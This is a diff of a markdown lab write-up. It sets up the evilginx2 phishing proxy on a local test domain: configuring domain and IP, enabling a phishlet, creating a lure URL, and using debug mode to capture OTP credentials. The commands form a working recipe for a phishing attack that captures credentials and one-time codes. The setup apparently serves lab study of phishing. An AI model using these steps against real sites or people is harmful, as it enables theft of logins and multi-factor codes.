@@ -95,29 +95,34 @@ root@e279e8098a4d:/evilginx2# ./evilginx2 -debug -developer
 
 :  
 
-
 ```
+Note that I used the debug option too, since, I don't know why at the moment, the phishlet refues to capture the otp credential. Using the debug options permit to get the whole requests.
                                         
 ## Config Evilngnix container
+```bash  
+: config domain targetsile.local
+: config ipv4 172.18.0.10
+: phishlets hostname targetsite-local targetsile.local
 
-	: config domain targetsile.local
-	: config ipv4 172.18.0.10
-	: phishlets hostname targetsite-local targetsile.local
-	: phishlets get-hosts targetsite-local 
-		172.18.0.10 login.targetsile.local
-		172.18.0.10 targetsile.local
-		
-	: phishlets enable  targetsite-local 
-	: lures create targetsite-local 
-	: lures
-		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
-		| id  |     phishlet      | hostname  |   path     | redirector  | redirect_url  | paused  |  og   |
-		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
-		| 0   | targetsite-local  |           | /AhsTYOfa  |             |               |         | ----  |
-		+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
- 
-	: lures get-url 0
-		https://login.targetsile.local/AhsTYOfa
+: phishlets get-hosts targetsite-local 
+	172.18.0.10 login.targetsile.local
+	172.18.0.10 targetsile.local
+	
+: phishlets enable  targetsite-local 
+: lures create targetsite-local 
+
+
++-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
+| id  |     phishlet      | hostname  |   path     | redirector  | redirect_url  | paused  |  og   |                                                                                                                                        
++-----+-------------------+-----------+------------+-------------+---------------+---------+-------+                                                                                                                                        
+| 0   | targetsite-local  |           | /nBfYHrTO  |             |               |         | ----  |                                                                                                                                        
++-----+-------------------+-----------+------------+-------------+---------------+---------+-------+                                                                                
+
+: lures get-url 0
+
+	https://login.targetsile.local/nBfYHrTO
+```
+	
 ## Visit the malicious URL
 
 
